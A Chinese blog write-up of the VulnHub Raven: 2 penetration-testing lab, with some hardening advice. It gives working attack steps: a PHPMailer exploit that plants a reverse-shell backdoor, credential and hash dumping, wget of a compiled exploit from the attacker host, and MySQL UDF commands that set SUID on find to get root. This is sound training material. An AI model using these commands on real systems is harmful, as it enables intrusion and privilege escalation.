---
layout: post
title: "Raven-2靶场渗透测试"
date: 2025-03-05 20:35:38 +0800
description: "查看/var/www/html/wordpress/wp-content/uploads/2018/11/flag3.png得到flag3。分别查看内容，在http://raven.local/vendor/PATH得到flag1。，该参数直接控制 MySQL 的文件导入/导出权限，是防御文件写入攻击（如SQL注入导出WebShell、UDF提权）的关键配置。然后使用path/to/venv/bin/python和path/to/venv/bin/pip。12，这些信息说明MSF提权是不可行的。"
keywords: "Raven: 2靶场渗透测试"
categories: ['未分类']
tags: ['网络安全', '数据库', '安全', '学习']
artid: "146043149"
image:
    path: https://api.vvhan.com/api/bing?rand=sj&artid=146043149
    alt: "Raven-2靶场渗透测试"
render_with_liquid: false
featuredImage: https://bing.ee123.net/img/rand?artid=146043149
featuredImagePreview: https://bing.ee123.net/img/rand?artid=146043149
cover: https://bing.ee123.net/img/rand?artid=146043149
image: https://bing.ee123.net/img/rand?artid=146043149
img: https://bing.ee123.net/img/rand?artid=146043149
---

<div class="blog-content-box">
 <div class="article-header-box">
  <div class="article-header">
   <div class="article-title-box">
    <h1 class="title-article" id="articleContentId">
     Raven: 2靶场渗透测试
    </h1>
   </div>
  </div>
 </div>
 <article class="baidu_pl">
  <div class="article_content clearfix" id="article_content">
   <link href="../../assets/css/kdoc_html_views-1a98987dfd.css" rel="stylesheet"/>
   <link href="../../assets/css/ck_htmledit_views-704d5b9767.css" rel="stylesheet"/>
   <div class="htmledit_views" id="content_views">
    <div>
     <div style="margin-left:0in">
      <div style="margin-left:0in">
       <p style="margin-left:0; margin-right:0">
        <strong>
         Raven: 2
        </strong>
       </p>
       <p style="margin-left:0; margin-right:0">
        <strong>
         来自 &lt;
        </strong>
        <a href="https://www.vulnhub.com/entry/raven-2,269/" rel="nofollow" title="Raven: 2 ~ VulnHub">
         Raven: 2 ~ VulnHub
        </a>
        <strong>
         &gt;
        </strong>
       </p>
       <p style="margin-left:0; margin-right:0">
       </p>
       <p style="margin-left:0; margin-right:0">
        1，将两台虚拟机网络连接都改为NAT模式
       </p>
       <p style="margin-left:0; margin-right:0">
        2，攻击机上做namp局域网扫描发现靶机
       </p>
       <p style="margin-left:0; margin-right:0">
        nmap -sn 192.168.23.0/24
       </p>
       <p style="margin-left:0; margin-right:0">
        <img alt="" height="300" src="https://i-blog.csdnimg.cn/direct/322ea13d109a448ca1a98de989ab74bd.png" width="555"/>
       </p>
       <p style="margin-left:0; margin-right:0">
        那么攻击机IP为192.168.23.182，靶场IP192.168.23.189
       </p>
       <p style="margin-left:0; margin-right:0">
        3，对靶机进行端口服务探测
       </p>
       <p style="margin-left:0; margin-right:0">
        nmap -sV -T4 -p- -A 192.168.23.189
       </p>
       <p style="margin-left:0; margin-right:0">
        <img alt="" height="454" src="https://i-blog.csdnimg.cn/direct/fa4c99cfa15d4d18ac4b0e256cb6d6c1.png" width="568"/>
       </p>
       <p style="margin-left:0; margin-right:0">
        <strong>
         HTTP服务（80/tcp）
        </strong>
       </p>
       <ul>
        <li>
         <strong>
          版本信息
         </strong>
         ：
         <br/>
         Apache 2.4.10 (Debian)
         <br/>
         该版本存在多个漏洞（如
         <a href="https://nvd.nist.gov/vuln/detail/CVE-2017-7679" rel="nofollow" title="CVE-2017-7679">
          CVE-2017-7679
         </a>
         、
         <a href="https://nvd.nist.gov/vuln/detail/CVE-2021-40438" rel="nofollow" title="CVE-2021-40438">
          CVE-2021-40438
         </a>
         ），可能导致请求走私或拒绝服务。
        </li>
        <li>
         <strong>
          暴露信息
         </strong>
         ：
         <ul>
          <li>
           服务器头明确显示版本（Apache/2.4.10 (Debian)），便于攻击者针对性利用。
          </li>
          <li>
           页面标题为“Raven Security”，可能为自定义Web应用，需检查是否存在SQL注入、XSS、文件上传等漏洞。
          </li>
         </ul>
        </li>
        <li>
         <strong>
          建议
         </strong>
         ：
         <ol>
          <li>
           <strong>
            升级Apache
           </strong>
           至最新稳定版（2.4.58+）。
          </li>
          <li>
           <strong>
            隐藏服务器版本信息
           </strong>
           ：
           <br/>
           ServerTokens Prod
           <br/>
           ServerSignature Off
          </li>
          <li>
           <strong>
            部署WAF
           </strong>
           （如ModSecurity）并定期扫描Web漏洞（使用工具如Nessus、Burp Suite）。
          </li>
         </ol>
         <ol>
          <li>
           检查Raven Security应用代码，修复潜在漏洞。
          </li>
         </ol>
        </li>
       </ul>
       <p style="margin-left:0; margin-right:0">
        <strong>
         RPC服务（111/tcp, 46435/tcp）
        </strong>
       </p>
       <ul>
        <li>
         <strong>
          服务详情
         </strong>
         ：
         <ul>
          <li>
           rpcbind 2-4：用于远程过程调用（RPC），管理NFS等服务的端口映射。
          </li>
          <li>
           开放端口包括111/tcp、46435/tcp及相关UDP端口，暴露了status服务（RPC #100024）。
          </li>
         </ul>
        </li>
        <li>
         <strong>
          风险
         </strong>
         ：
         <ul>
          <li>
           已知漏洞如
           <a href="https://nvd.nist.gov/vuln/detail/CVE-2017-8779" rel="nofollow" title="CVE-2017-8779">
            CVE-2017-8779
           </a>
           （缓冲区溢出导致RCE）。
          </li>
          <li>
           RPC服务可能被用于DDoS反射攻击或信息泄露。
          </li>
         </ul>
        </li>
        <li>
         <strong>
          建议
         </strong>
         ：
         <ol>
          <li>
           <strong>
            禁用不必要的RPC服务
           </strong>
           ：
           <br/>
           systemctl stop rpcbind
           <br/>
           systemctl disable rpcbind
          </li>
         </ol>
         <ol>
          <li>
           若必须使用NFS，
           <strong>
            限制访问IP
           </strong>
           并升级至最新版本。
          </li>
         </ol>
         <ol>
          <li>
           <strong>
            配置防火墙
           </strong>
           （如iptables）阻止外部访问RPC端口。
          </li>
         </ol>
        </li>
       </ul>
       <p style="margin-left:0; margin-right:0">
       </p>
       <p style="margin-left:0; margin-right:0">
        4，依然访问80端口服务
       </p>
       <p style="margin-left:0; margin-right:0">
        <img alt="" height="349" src="https://i-blog.csdnimg.cn/direct/5e08b21ab7164570bdcff7b158a90709.png" width="421"/>
       </p>
       <p style="margin-left:0; margin-right:0">
        和raven是一样的，卡顿的原因是因为没有做域名解析，手动修改/etc/hosts配置一下
       </p>
       <p style="margin-left:0; margin-right:0">
        vim /etc/hosts
       </p>
       <p style="margin-left:0; margin-right:0">
        192.168.23.189 raven.local
       </p>
       <p style="margin-left:0; margin-right:0">
        <img alt="" height="212" src="https://i-blog.csdnimg.cn/direct/397f3af051ef4132af241a2fdbe2f317.png" width="471"/>
       </p>
       <p style="margin-left:0; margin-right:0">
       </p>
       <p style="margin-left:0; margin-right:0">
        5，枚举扫描网站的子目录
       </p>
       <p style="margin-left:0; margin-right:0">
        dirsearch -u
        <a href="http://raven.local" rel="nofollow" title="http://raven.local">
         http://raven.local
        </a>
        -x 404,403,500
       </p>
       <p style="margin-left:0; margin-right:0">
        <img alt="" height="334" src="https://i-blog.csdnimg.cn/direct/f3931dec9f384a52be1ac59d02faa89a.png" width="544"/>
       </p>
       <p style="margin-left:0; margin-right:0">
        观察目录看见网站依然是wordpress搭建的。分别查看内容，在http://raven.local/vendor/PATH得到flag1
       </p>
       <p style="margin-left:0; margin-right:0">
        <img alt="" height="135" src="https://i-blog.csdnimg.cn/direct/1ccb1ce63e1440b9b8c187961e079300.png" width="467"/>
       </p>
       <p style="margin-left:0; margin-right:0">
        而在http://raven.local/vendor/README.md网页，这些内容对网站构成了信息泄露
       </p>
       <p style="margin-left:0; margin-right:0">
        <img alt="" height="179" src="https://i-blog.csdnimg.cn/direct/ced9be3670ff4aa1a56ebce88923bf5d.png" width="735"/>
       </p>
       <p style="margin-left:0; margin-right:0">
        <a href="http://raven.local/vendor/VERSION" rel="nofollow" title="http://raven.local/vendor/VERSION">
         http://raven.local/vendor/VERSION
        </a>
        可以知道PHPMailer版本为5.2.1
       </p>
       <p style="margin-left:0; margin-right:0">
        <img alt="" height="125" src="https://i-blog.csdnimg.cn/direct/87584cd61d8245c99f97199495a80a97.png" width="503"/>
       </p>
       <p style="margin-left:0; margin-right:0">
        然后再看看/wordpress
       </p>
       <p style="margin-left:0; margin-right:0">
        <img alt="" height="345" src="https://i-blog.csdnimg.cn/direct/ed09fb0a221a4247acbe9aa64f6b22aa.png" width="930"/>
       </p>
       <p style="margin-left:0; margin-right:0">
        再whatweb做指纹识别扫描
       </p>
       <p style="margin-left:0; margin-right:0">
        <img alt="" height="191" src="https://i-blog.csdnimg.cn/direct/882c94509510481e8555c8c63d69d41d.png" width="603"/>
       </p>
       <p style="margin-left:0; margin-right:0">
       </p>
       <p style="margin-left:0; margin-right:0">
        6，检索漏洞，查看PHPmailer的公开exp
       </p>
       <p style="margin-left:0; margin-right:0">
        searchsploit PHPmailer
       </p>
       <p style="margin-left:0; margin-right:0">
        <img alt="" height="548" src="https://i-blog.csdnimg.cn/direct/15804909472642d1af158b6f7543bc4b.png" width="624"/>
       </p>
       <p style="margin-left:0; margin-right:0">
        使用40974.py
       </p>
       <p style="margin-left:0; margin-right:0">
        searchsploit -m 40974.py
       </p>
       <p style="margin-left:0; margin-right:0">
        <img alt="" height="154" src="https://i-blog.csdnimg.cn/direct/2ffa4178e75949309063f9798e279422.png" width="505"/>
       </p>
       <p style="margin-left:0; margin-right:0">
       </p>
       <p style="margin-left:0; margin-right:0">
        7，然后修改编辑exp，使之能够使用
       </p>
       <p style="margin-left:0; margin-right:0">
        开头加上：
       </p>
       <p style="margin-left:0; margin-right:0">
        #!/usr/bin/python
       </p>
       <p style="margin-left:0; margin-right:0">
        # -*- coding: utf-8 -*-
       </p>
       <p style="margin-left:0; margin-right:0">
        <img alt="" height="154" src="https://i-blog.csdnimg.cn/direct/d127ed48549646d4a5883948b81e43d8.png" width="341"/>
       </p>
       <p style="margin-left:0; margin-right:0">
        然后修改三处target,payload,fields
       </p>
       <p style="margin-left:0; margin-right:0">
        <img alt="" height="230" src="https://i-blog.csdnimg.cn/direct/1c14ef275ad34b058e3971c5ac39456c.png" width="616"/>
       </p>
       <p style="margin-left:0; margin-right:0">
        但是直接运行会存在问题
       </p>
       <p style="margin-left:0; margin-right:0">
        <img alt="" height="541" src="https://i-blog.csdnimg.cn/direct/67f9a899e0e7460aa2e97fd15ceeb383.png" width="626"/>
       </p>
       <p style="margin-left:0; margin-right:0">
        × 此Python环境受外部管理
       </p>
       <p style="margin-left:0; margin-right:0">
        ╰─&gt; 若需在系统全局安装Python包，请尝试使用apt安装
       </p>
       <p style="margin-left:0; margin-right:0">
        python3-xyz，其中xyz是你要安装的包名。
       </p>
       <p style="margin-left:0; margin-right:0">
        如果你想安装非Kali官方仓库提供的Python包，
       </p>
       <p style="margin-left:0; margin-right:0">
        请使用python3 -m venv path/to/venv创建一个虚拟环境。
       </p>
       <p style="margin-left:0; margin-right:0">
        然后使用path/to/venv/bin/python和path/to/venv/bin/pip。
       </p>
       <p style="margin-left:0; margin-right:0">
        确保已安装pypy3-venv。
       </p>
       <p style="margin-left:0; margin-right:0">
        如果你想安装非Kali官方仓库提供的Python应用程序，
       </p>
       <p style="margin-left:0; margin-right:0">
        最简单的方法是使用pipx install xyz，它会为你管理虚拟环境。
       </p>
       <p style="margin-left:0; margin-right:0">
        确保已安装pipx。
       </p>
       <p style="margin-left:0; margin-right:0">
        更多信息请参考：
       </p>
       <p style="margin-left:0; margin-right:0">
        *
        <a href="https://www.kali.org/docs/general-use/python3-external-packages/" rel="nofollow" title="Installing Python Applications via pipx | Kali Linux Documentation">
         Installing Python Applications via pipx | Kali Linux Documentation
        </a>
       </p>
       <p style="margin-left:0; margin-right:0">
        * /usr/share/doc/python3.12/README.venv
       </p>
       <p style="margin-left:0; margin-right:0">
        注意：如果你认为这是一个错误，请联系Python或系统发行版的支持人员。
       </p>
       <p style="margin-left:0; margin-right:0">
        你可以通过添加`--break-system-packages`参数强制安装，但这可能破坏Python环境或系统。
       </p>
       <p style="margin-left:0; margin-right:0">
       </p>
       <p style="margin-left:0; margin-right:0">
        <strong>
         解决方案：
        </strong>
       </p>
       <p style="margin-left:0; margin-right:0">
        export https_proxy="http://192.168.99.74:50302"
       </p>
       <p style="margin-left:0; margin-right:0">
        # 安装虚拟环境工具（如果未安装）
        <br/>
        sudo apt install python3-venv
       </p>
       <p style="margin-left:0; margin-right:0">
        # 创建并激活虚拟环境
        <br/>
        python3 -m venv myenv       # 创建名为myenv的虚拟环境
        <br/>
        source myenv/bin/activate  # 激活虚拟环境
       </p>
       <p style="margin-left:0; margin-right:0">
        # 在虚拟环境中安装requests_toolbelt
        <br/>
        pip3 install requests_toolbelt
       </p>
       <p style="margin-left:0; margin-right:0">
        pip3 install lxml
       </p>
       <p style="margin-left:0; margin-right:0">
        <img alt="" height="584" src="https://i-blog.csdnimg.cn/direct/215e6520d700469cb88a8ed6ea8ce551.png" width="618"/>
       </p>
       <p style="margin-left:0; margin-right:0">
        #虚拟环境中启动攻击脚本
       </p>
       <p style="margin-left:0; margin-right:0">
        <img alt="" height="214" src="https://i-blog.csdnimg.cn/direct/a8a851dbe7774a13a1fd26869de0a756.png" width="622"/>
       </p>
       <p style="margin-left:0; margin-right:0">
        # 使用后退出虚拟环境
        <br/>
        deactivate
       </p>
       <p style="margin-left:0; margin-right:0">
       </p>
       <p style="margin-left:0; margin-right:0">
        与此同时kali需要nc监听4444端口，访问后门文件就会触发反弹shell
       </p>
       <p style="margin-left:0; margin-right:0">
        <a href="http://raven.local/icepeak.php" rel="nofollow" title="http://raven.local/icepeak.php">
         http://raven.local/icepeak.php
        </a>
       </p>
       <p style="margin-left:0; margin-right:0">
        <img alt="" height="109" src="https://i-blog.csdnimg.cn/direct/554fd40052b14f6eb4c6c407fe4990e3.png" width="546"/>
       </p>
       <p style="margin-left:0; margin-right:0">
        成功getshell
       </p>
       <p style="margin-left:0; margin-right:0">
       </p>
       <p style="margin-left:0; margin-right:0">
        8，python启动可交互shell在该用户下查找flag
       </p>
       <p style="margin-left:0; margin-right:0">
        python -c 'import pty;pty.spawn("/bin/bash")'
       </p>
       <p style="margin-left:0; margin-right:0">
        <img alt="" height="100" src="https://i-blog.csdnimg.cn/direct/c2915473b5484bb99a4c63d602e9ff2d.png" width="440"/>
       </p>
       <p style="margin-left:0; margin-right:0">
        find / -name flag*
       </p>
       <p style="margin-left:0; margin-right:0">
        <img alt="" height="72" src="https://i-blog.csdnimg.cn/direct/8c4356fe78d24f0aa310423cf7f0b6e1.png" width="490"/>
       </p>
       <p style="margin-left:0; margin-right:0">
        cat /var/www/flag2.txt
       </p>
       <p style="margin-left:0; margin-right:0">
        <img alt="" height="66" src="https://i-blog.csdnimg.cn/direct/4ff009301fb44457b5aaf9423b048c8b.png" width="421"/>
       </p>
       <p style="margin-left:0; margin-right:0">
        查看/var/www/html/wordpress/wp-content/uploads/2018/11/flag3.png得到flag3。访问：
       </p>
       <p style="margin-left:0; margin-right:0">
        <a href="http://raven.local/wordpress/wp-content/uploads/2018/11/flag3.png" rel="nofollow" title="http://raven.local/wordpress/wp-content/uploads/2018/11/flag3.png">
         http://raven.local/wordpress/wp-content/uploads/2018/11/flag3.png
        </a>
       </p>
       <p style="margin-left:0; margin-right:0">
        <img alt="" height="258" src="https://i-blog.csdnimg.cn/direct/d8c39123eae64585a49089535e911860.png" width="815"/>
       </p>
       <p style="margin-left:0; margin-right:0">
       </p>
       <p style="margin-left:0; margin-right:0">
        9，接下来是一样的套路，查看数据库配置文件以得到数据库登录密码
       </p>
       <p style="margin-left:0; margin-right:0">
        <img alt="" height="278" src="https://i-blog.csdnimg.cn/direct/f7051c9b1547401ab1e6a0fe4b14a573.png" width="617"/>
       </p>
       <p style="margin-left:0; margin-right:0">
        得到账户/密码:root/R@v3nSecurity
       </p>
       <p style="margin-left:0; margin-right:0">
        <img alt="" height="236" src="https://i-blog.csdnimg.cn/direct/2e936486d94a4b26abff4dea990d5079.png" width="533"/>
       </p>
       <p style="margin-left:0; margin-right:0">
       </p>
       <p style="margin-left:0; margin-right:0">
        10，靶机本地登录数据库
       </p>
       <p style="margin-left:0; margin-right:0">
        mysql -u root -p
       </p>
       <p style="margin-left:0; margin-right:0">
        <img alt="" height="302" src="https://i-blog.csdnimg.cn/direct/5f978dcf95e84dfdbee5228ad55ef9ce.png" width="624"/>
       </p>
       <p style="margin-left:0; margin-right:0">
        查看数据库 show databases;
       </p>
       <p style="margin-left:0; margin-right:0">
        使用数据库 use wordpress;
       </p>
       <p style="margin-left:0; margin-right:0">
        <img alt="" height="286" src="https://i-blog.csdnimg.cn/direct/6d0fe46ba3c44c9e9b17fb623d40d0cb.png" width="537"/>
       </p>
       <p style="margin-left:0; margin-right:0">
        查看数据表 show tables;
       </p>
       <p style="margin-left:0; margin-right:0">
        从数据表从查询用户名密码  select * from wp_users;
       </p>
       <p style="margin-left:0; margin-right:0">
        <img alt="" height="550" src="https://i-blog.csdnimg.cn/direct/0964f8ad5d824cf6b36cf5f027297e03.png" width="737"/>
       </p>
       <p style="margin-left:0; margin-right:0">
        michael|$P$BjRvZQ.VQcGZlDeiKToCQd.cPw5XCe0
       </p>
       <p style="margin-left:0; margin-right:0">
        steven|$P$B6X3H3ykawf2oHuPsbjQiih5iJXqad.
       </p>
       <p style="margin-left:0; margin-right:0">
       </p>
       <p style="margin-left:0; margin-right:0">
        <strong>
         MySQL UDF提权的场景
        </strong>
       </p>
       <p style="margin-left:0; margin-right:0">
        <strong>
         UDF（User-Defined Function，用户自定义函数）提权
        </strong>
        是一种通过MySQL功能执行系统命令的攻击方式，常见于以下场景：
       </p>
       <ol>
        <li>
         <strong>
          已获取MySQL数据库权限
         </strong>
         ：
         <ul>
          <li>
           攻击者通过SQL注入、弱口令、数据库配置泄露等方式获取MySQL账户权限（如SELECT、FILE权限）。
          </li>
         </ul>
        </li>
        <li>
         <strong>
          需要系统级权限提升
         </strong>
         ：
         <ul>
          <li>
           数据库用户权限较低（如普通用户），但通过UDF可调用系统命令（如执行/bin/bash）。
          </li>
         </ul>
        </li>
        <li>
         <strong>
          目标系统未严格限制文件写入
         </strong>
         ：
         <ul>
          <li>
           MySQL服务账户（如mysql用户）具备写入系统敏感目录（如插件目录/usr/lib/mysql/plugin/）的权限。
          </li>
         </ul>
        </li>
       </ol>
       <p style="margin-left:0; margin-right:0">
        <strong>
         UDF提权的必要条件
        </strong>
       </p>
       <p style="margin-left:0; margin-right:0">
        <strong>
         1. MySQL权限要求
        </strong>
       </p>
       <ul>
        <li>
         <strong>
          FILE权限
         </strong>
         ：允许读写服务器文件（通过SELECT ... INTO OUTFILE或LOAD_FILE）。
        </li>
        <li>
         <strong>
          CREATE FUNCTION权限
         </strong>
         ：允许创建自定义函数。
        </li>
        <li>
         <strong>
          INSERT/UPDATE权限
         </strong>
         ：可能需操作mysql.func表注册函数。
        </li>
       </ul>
       <p style="margin-left:0; margin-right:0">
        <strong>
         2. 系统环境要求
        </strong>
       </p>
       <ul>
        <li>
         <strong>
          插件目录可写
         </strong>
         ：
         <br/>
         MySQL的插件目录（如/usr/lib/mysql/plugin/）对MySQL进程可写，且路径可通过以下命令查询：
         <br/>
         SHOW VARIABLES LIKE 'plugin_dir';
        </li>
        <li>
         <strong>
          secure_file_priv配置宽松
         </strong>
         ：
         <br/>
         若该参数设置为空或指定可写目录，允许导出文件：
         <br/>
         SHOW VARIABLES LIKE 'secure_file_priv';
        </li>
        <li>
         <strong>
          UDF动态库兼容性
         </strong>
         ：
         <ul>
          <li>
           动态库文件（.so或.dll）需与操作系统及MySQL版本匹配（如Linux用.so，Windows用.dll）。
          </li>
          <li>
           示例库：lib_mysqludf_sys.so（用于执行系统命令）。
          </li>
         </ul>
        </li>
       </ul>
       <p style="margin-left:0; margin-right:0">
        <strong>
         3. MySQL服务权限
        </strong>
       </p>
       <ul>
        <li>
         <strong>
          MySQL运行账户权限
         </strong>
         ：
         <br/>
         MySQL服务进程（如mysqld）需以高权限账户运行（如root或具备sudo权限的账户），否则提权后只能获取低权限Shell。
        </li>
       </ul>
       <p style="margin-left:0; margin-right:0">
       </p>
       <p style="margin-left:0; margin-right:0">
        11，但是知道账户密码没有用，需要数据库提权。判断之后分析无法使用UDF提权：
       </p>
       <p style="margin-left:0; margin-right:0">
        禁止使用root用户远程登录
       </p>
       <p style="margin-left:0; margin-right:0">
        <img alt="" height="298" src="https://i-blog.csdnimg.cn/direct/a5da23f6cd2f4dcb80be393cae1bc089.png" width="544"/>
       </p>
       <p style="margin-left:0; margin-right:0">
        show global variables like 'secure%';
       </p>
       <p style="margin-left:0; margin-right:0">
        用于查询 MySQL 全局变量中所有以 secure 开头的配置参数，主要用于检查与安全相关的关键设置。
       </p>
       <p style="margin-left:0; margin-right:0">
        <strong>
         核心目标是确认 secure_file_priv 的值
        </strong>
        ，该参数直接控制 MySQL 的文件导入/导出权限，是防御文件写入攻击（如SQL注入导出WebShell、UDF提权）的关键配置。
       </p>
       <p style="margin-left:0; margin-right:0">
        <img alt="" height="154" src="https://i-blog.csdnimg.cn/direct/d0c3f2e15c5e43449cbae4d1a87f5971.png" width="363"/>
       </p>
       <p style="margin-left:0; margin-right:0">
        SHOW VARIABLES LIKE '%plugin%';
       </p>
       <p style="margin-left:0; margin-right:0">
        用于查询 MySQL 中所有名称包含 plugin 的系统变量，
        <strong>
         核心目标是获取与插件（Plugin）相关的配置信息
        </strong>
        ，尤其是插件目录路径、加载状态及认证插件类型。这些信息在安全审计和漏洞利用（如UDF提权、认证绕过）中至关重要。
       </p>
       <p style="margin-left:0; margin-right:0">
        <img alt="" height="138" src="https://i-blog.csdnimg.cn/direct/f8954a160b184e9b81f44e1abd73110c.png" width="348"/>
       </p>
       <p style="margin-left:0; margin-right:0">
       </p>
       <p style="margin-left:0; margin-right:0">
        12，这些信息说明MSF提权是不可行的。尝试版本漏洞提权，首先我们要知道数据库的版本
       </p>
       <p style="margin-left:0; margin-right:0">
        select version();
       </p>
       <p style="margin-left:0; margin-right:0">
        <img alt="" height="148" src="https://i-blog.csdnimg.cn/direct/1762dcc285794bd6be852833c14b4d03.png" width="207"/>
       </p>
       <p style="margin-left:0; margin-right:0">
        检索漏洞信息，使用1518.c
       </p>
       <p style="margin-left:0; margin-right:0">
        searchsploit mysql UDF
       </p>
       <p style="margin-left:0; margin-right:0">
        searchsploit -m 1518.c
       </p>
       <p style="margin-left:0; margin-right:0">
        <img alt="" height="367" src="https://i-blog.csdnimg.cn/direct/1cf62efdbc2f4088b6683e7533b8ff14.png" width="624"/>
       </p>
       <p style="margin-left:0; margin-right:0">
       </p>
       <p style="margin-left:0; margin-right:0">
        13，阅读exp，使用方法如下
       </p>
       <p style="margin-left:0; margin-right:0">
        <img alt="" height="448" src="https://i-blog.csdnimg.cn/direct/04fe9d8eaaca4c0294d04da9bd2ffb4b.png" width="611"/>
       </p>
       <p style="margin-left:0; margin-right:0">
        然后进行编译
       </p>
       <p style="margin-left:0; margin-right:0">
        gcc -g -c 1518.c
       </p>
       <p style="margin-left:0; margin-right:0">
        gcc -g -shared -o 1518.so 1518.o -lc
       </p>
       <p style="margin-left:0; margin-right:0">
        -g
        <span style="color:green">
         //生成调试信息
        </span>
       </p>
       <p style="margin-left:0; margin-right:0">
        -c
        <span style="color:green">
         //编译（二进制）
        </span>
       </p>
       <p style="margin-left:0; margin-right:0">
        -shared
        <span style="color:green">
         //创建一个动态链接库，输入文件可以是源文件、汇编文件或者目标文件
        </span>
       </p>
       <p style="margin-left:0; margin-right:0">
        -o
        <span style="color:green">
         //指定输出文件的名称
        </span>
       </p>
       <p style="margin-left:0; margin-right:0">
        -lc
        <span style="color:green">
         //这个选项告诉链接器链接C标准库。这是生成大多数C程序所必需的。
        </span>
       </p>
       <p style="margin-left:0; margin-right:0">
        <img alt="" height="256" src="https://i-blog.csdnimg.cn/direct/27678b0ca30a4c768d1283d9b3015449.png" width="618"/>
       </p>
       <p style="margin-left:0; margin-right:0">
       </p>
       <p style="margin-left:0; margin-right:0">
        攻击机使用python的http模块开启服务
       </p>
       <p style="margin-left:0; margin-right:0">
        python -m http.server
       </p>
       <p style="margin-left:0; margin-right:0">
        <img alt="" height="89" src="https://i-blog.csdnimg.cn/direct/3067f497a04747ac8a11c6e734e7bff6.png" width="594"/>
       </p>
       <p style="margin-left:0; margin-right:0">
        靶机进入tmp下载exp
       </p>
       <p style="margin-left:0; margin-right:0">
        wget
        <a href="http://192.168.23.182:8000/1518.so" rel="nofollow" title="http://192.168.23.182:8000/1518.so">
         http://192.168.23.182:8000/1518.so
        </a>
       </p>
       <p style="margin-left:0; margin-right:0">
        <img alt="" height="246" src="https://i-blog.csdnimg.cn/direct/6263f215aa304c90b42d2c367d8d46cc.png" width="622"/>
       </p>
       <p style="margin-left:0; margin-right:0">
        然后登录数据库，创建自定义函数
       </p>
       <p style="margin-left:0; margin-right:0">
        mysql -u root -p R@v3nSecurity
       </p>
       <p style="margin-left:0; margin-right:0">
        use mysql;
       </p>
       <p style="margin-left:0; margin-right:0">
        create table foo(line blob);
       </p>
       <p style="margin-left:0; margin-right:0">
        insert into foo values(load_file('/tmp/1518.so'));
       </p>
       <p style="margin-left:0; margin-right:0">
        select * from foo into dumpfile '/usr/lib/mysql/plugin/1518.so';
       </p>
       <p style="margin-left:0; margin-right:0">
        create function do_system returns integer soname '1518.so';
       </p>
       <p style="margin-left:0; margin-right:0">
        select * from mysql.func;
       </p>
       <p style="margin-left:0; margin-right:0">
        select do_system('chmod u+s /usr/bin/find');
       </p>
       <p style="margin-left:0; margin-right:0">
        quit
       </p>
       <p style="margin-left:0; margin-right:0">
        <img alt="" height="635" src="https://i-blog.csdnimg.cn/direct/b23730d38c924972a9a589a70ba25d1f.png" width="593"/>
       </p>
       <p style="margin-left:0; margin-right:0">
        touch foo
       </p>
       <p style="margin-left:0; margin-right:0">
        find foo touch -exec "/bin/sh" \;
       </p>
       <p style="margin-left:0; margin-right:0">
        <img alt="" height="132" src="https://i-blog.csdnimg.cn/direct/75e7d3dd7c67404393bc672d9a3a0f14.png" width="443"/>
       </p>
       <p style="margin-left:0; margin-right:0">
        成功提权成为root，得到flag4
       </p>
       <p style="margin-left:0; margin-right:0">
        <img alt="" height="388" src="https://i-blog.csdnimg.cn/direct/5781aad4239d43acb191768e6ef85f77.png" width="473"/>
       </p>
      </div>
     </div>
    </div>
   </div>
  </div>
 </article>
 <p alt="68747470733a2f2f626c6f672e:6373646e2e6e65742f7a686f6e677975656b616e673832302f:61727469636c652f64657461696c732f313436303433313439" class_="artid" style="display:none">
 </p>
</div>


